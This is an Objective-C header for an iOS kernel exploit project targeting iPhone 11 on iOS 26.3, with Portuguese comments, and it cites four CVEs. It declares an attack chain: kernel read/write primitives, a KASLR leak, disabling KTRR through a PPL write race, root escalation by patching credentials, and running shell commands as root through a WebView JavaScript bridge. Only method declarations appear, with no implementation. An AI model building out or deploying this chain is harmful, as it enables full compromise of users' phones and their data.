//
//  KernelDriver.h
//  A13Exploit - REAL Kernel Exploit for iOS 26.3
//  iPhone 11 (A13) | CVE-2026-20687, 20698, 28867, 28868
//

#import <Foundation/Foundation.h>
#import <WebKit/WebKit.h>

NS_ASSUME_NONNULL_BEGIN

@interface KernelDriver : NSObject <WKScriptMessageHandler>

// ==================== Inicialização ====================

/**
 * Inicializa o KernelDriver com uma WebView para bridge JavaScript
 * @param webView WKWebView para comunicação JS ↔ Native
 * @return Instância inicializada
 */
- (instancetype)initWithWebView:(WKWebView *)webView;

// ==================== Operações de Kernel ====================

/**
 * Lê 8 bytes da memória do kernel
 * @param address Endereço virtual no kernel
 * @return Valor lido ou 0 em caso de erro
 */
- (uint64_t)kread64:(uint64_t)address;

/**
 * Lê 4 bytes da memória do kernel
 * @param address Endereço virtual no kernel
 * @return Valor lido ou 0 em caso de erro
 */
- (uint32_t)kread32:(uint64_t)address;

/**
 * Escreve 8 bytes na memória do kernel (usa PPL write race)
 * @param address Endereço virtual no kernel
 * @param value Valor a ser escrito
 */
- (void)kwrite64:(uint64_t)address value:(uint64_t)value;

/**
 * Escreve 4 bytes na memória do kernel
 * @param address Endereço virtual no kernel
 * @param value Valor a ser escrito
 */
- (void)kwrite32:(uint64_t)address value:(uint32_t)value;

// ==================== Estágios do Exploit ====================

/**
 * CVE-2026-28868 / CVE-2026-28867: Leak kernel slide via Mach messages
 * @return Kernel slide (KASLR offset) ou 0 em caso de falha
 */
- (uint64_t)leakKernelSlide;

/**
 * CVE-2026-20698: Desabilita proteção KTRR via PPL write race
 * @return YES se KTRR foi desabilitado, NO caso contrário
 */
- (BOOL)disableKTRR;

/**
 * CVE-2026-20687: Escalona para root via patch ucred
 * @return YES se root foi obtido, NO caso contrário
 */
- (BOOL)escalateToRoot;

/**
 * Executa a cadeia completa do exploit
 * @param callback Bloco executado ao final com resultado
 */
- (void)runFullExploitWithCallback:(void(^)(BOOL success, NSString *message))callback;

// ==================== Utilitários ====================

/**
 * Retorna o UID atual do processo
 * @return UID (0 = root, 501 = mobile)
 */
- (uint64_t)getCurrentUID;

/**
 * Executa um comando shell com privilégios de root
 * @param command Comando a ser executado
 * @param callback Bloco chamado com o output do comando
 */
- (void)executeCommand:(NSString *)command withCallback:(void(^)(NSString *output))callback;

@end

NS_ASSUME_NONNULL_END
